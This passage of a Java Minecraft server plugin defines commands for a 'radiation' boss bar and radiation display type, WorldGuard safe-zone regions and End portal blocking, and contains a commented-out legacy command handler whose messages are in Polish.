                                    CommandSender sender = ctx.getSource().getSender();
                                    final NamedTextColor color = ctx.getArgument("color", NamedTextColor.class);
                                    final String name = StringArgumentType.getString(ctx, "name");

                                    affectedBar.name(Component.text(name, color));

                                    config.set("setRadiationName", Component.text(name, color));
                                    saveConfig();

                                    sender.sendRichMessage("Radiation name is now <name>",
                                            Placeholder.component("name",
                                                    Component.text(name, color)));
                                    return Command.SINGLE_SUCCESS;
                    })
            )
            .then(Commands.literal("chooseRadiation")
                .requires(src -> src.getSender() instanceof Player)
                    .then(Commands.argument("type", StringArgumentType.word())
                        .suggests((ctx, builder) -> {
                            builder.suggest("glass");
                            builder.suggest("forcefield");
                            builder.suggest("nothing");
                            return builder.buildFuture();
                        })
                        .executes(ctx -> {
                            Player player = (Player) ctx.getSource().getSender();
                            String type = StringArgumentType.getString(ctx, "type");

                            if (!Set.of("glass", "forcefield", "nothing").contains(type)) {
                                player.sendMessage(Component.text("Type must be one of: glass, forcefield, nothing", NamedTextColor.RED));
                                return 0;
                            }

                            NamespacedKey key = new NamespacedKey(this, "radiationType");
                            player.getPersistentDataContainer()
                                    .set(key, PersistentDataType.STRING, type);
                            player.sendRichMessage("Your radiation type is now <type>",
                                    Placeholder.parsed("type", type));

                            return Command.SINGLE_SUCCESS;
                        })
                    )
            )
            .build();

    /*  @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        String commandName = command.getName();
        if (commandName.equalsIgnoreCase("WhatsSafeZoneSize")) {
            radius = config.getInt("Radiation_Safe_Zone_Size");
            height = config.getInt("Radiation_Safe_Zone_Height");
            if (radius != 0) {
                sender.sendMessage(ChatColor.GREEN + "Bezpieczna strefa ma promień o długości: " + radius);
            } else {
                sender.sendMessage(ChatColor.RED + "Jeszcze nie stworzono bezpiecznej stefy");
            }
            return true;
        }
        if (sender.isOp() && args.length > 0) {
            switch (commandName) {
                case "radiationsafezone" -> {
                    if (sender instanceof Player) {
                        try {
                            radius = Integer.parseInt(args[0]);
                            if (args.length == 2) {
                                height = Integer.parseInt(args[1]);
                            } else {
                                height = 320;
                            }

                            if (getSafeZone((Player) sender, "rad", radius, height)) {
                                config.set("Radiation_Safe_Zone_Size", radius);
                                config.set("Radiation_Safe_Zone_Height", height);
                                saveConfig();
                                sender.sendMessage(ChatColor.GREEN + "Bezpieczna strefa ma teraz promień: " + radius);
                            } else {
                                sender.sendMessage(ChatColor.RED + "Wystąpił błąd przy dodawaniu regionu.");
                            }
                        } catch (NumberFormatException e) {
                            sender.sendMessage(ChatColor.RED + "Podaj poprawny promień.");
                        }
                    } else {
                    sender.sendMessage(ChatColor.RED + "Musisz być graczem");
                    }
            }
                case "deathLightningStrike" -> {
                    try {
                        boolean shouldStrikeLightning = Boolean.parseBoolean(args[0]);
                        ChatColor color = shouldStrikeLightning ? ChatColor.GREEN : ChatColor.RED;
                        config.set("Death_Lightning_Strike", shouldStrikeLightning);
                        saveConfig();

                        sender.sendMessage("Death_Lightning_Strike is now set to: " + color + shouldStrikeLightning);
                    } catch (Exception e) {
                        sender.sendMessage(ChatColor.RED + "Napisz <true> lub <false>");
                    }
                }
                case "dropPlayerHead" -> {
                    try {
                        boolean shouldDropPlayerHead = Boolean.parseBoolean(args[0]);

                        config.set("Drop_Player_Head", shouldDropPlayerHead);
                        saveConfig();

                        ChatColor color = shouldDropPlayerHead ? ChatColor.GREEN : ChatColor.RED;
                        sender.sendMessage("Drop_Player_Head is now set to: " + color + shouldDropPlayerHead);
                    } catch (Exception e) {
                        sender.sendMessage(ChatColor.RED + "Napisz <true> lub <false>");
                    }
                }
                case "setDurationTo" -> {
                    try {
                        long timeInMinutes = Math.abs(Long.parseLong(args[0]));
                        config.set("Duration", timeInMinutes * 60 * 1000);
                        saveConfig();

                        String minut_Odmienioned = (timeInMinutes > 20 && (timeInMinutes % 10 >= 2 && timeInMinutes % 10 <= 4)) ? "minuty" : "minut";
                        sender.sendMessage("Czas trwania potki to teraz: " + timeInMinutes + " " + minut_Odmienioned);
                    } catch (Exception e) {
                        sender.sendMessage("podaj czas w minutach, poprawnie (poprawnie czyli bez 'm' na końcu), nie wiem jak można tu błąd zrobić");
                    }
                }
                case "endEnabled" -> {
                    try {
                        boolean a = Boolean.parseBoolean(args[0]);
                        config.set("End_Enabled", a);
                        saveConfig();

                        sender.sendMessage("End jest teraz " + a + " czy coś");
                    } catch (Exception e) {
                        sender.sendMessage("Coś poszło nie tak, potencjalnie źle true lub false napisałeś");
                    }
                }
                case "setRadiationName" -> {
                    String a = args[0];
                    affectedBar.setTitle(ChatColor.RED + a);
                    config.set("Radiation_Name",ChatColor.RED + a);
                    saveConfig();
                }
            }
        } else {
                sender.sendMessage(ChatColor.RED + ("Nie masz uprawnień do tej komendy " + ChatColor.DARK_RED + "knypku"));
        }
        return true;
    }*/

    public ProtectedCuboidRegion getRegion(Entity p, String regionName, int radius, int height) {
        Location loc = p.getLocation();
        BlockVector3 min = BlockVector3.at(loc.getBlockX() - radius, -64, loc.getBlockZ() - radius);
        BlockVector3 max = BlockVector3.at(loc.getBlockX() + radius, height, loc.getBlockZ() + radius);

        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(p.getWorld()));
        if (regions == null) {
            p.sendMessage(Component.text("Spróbuj ponownie, bo Region Manager się zepsuł, niewiadomo dlaczego",  NamedTextColor.RED));
        }
        if (regions.hasRegion(regionName)) {
            regions.removeRegion(regionName);
        }

        return new ProtectedCuboidRegion(regionName, min, max);
    }

 /*   public ProtectedCuboidRegion createRegion(Player p, String regionName, BlockVector3 min, BlockVector3 max) {
        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(p.getWorld()));
        if (regions == null) {
            p.sendMessage(ChatColor.RED + "Spróbuj ponownie, bo Region Manager się zepsuł, niewiadomo dlaczego");
        }
        if (regions.hasRegion(regionName)) {
            regions.removeRegion(regionName);
        }

        return new ProtectedCuboidRegion(regionName, min, max);
    }*/

    @EventHandler
    public void onEndEnter(PlayerPortalEvent event) {
        if (!config.getBoolean("End_Enabled") && event.getCause() == PlayerTeleportEvent.TeleportCause.END_PORTAL) {
            event.setCancelled(true);
            event.getPlayer().sendMessage(Component.text("End is disabled!",  NamedTextColor.RED));
        }
    }
}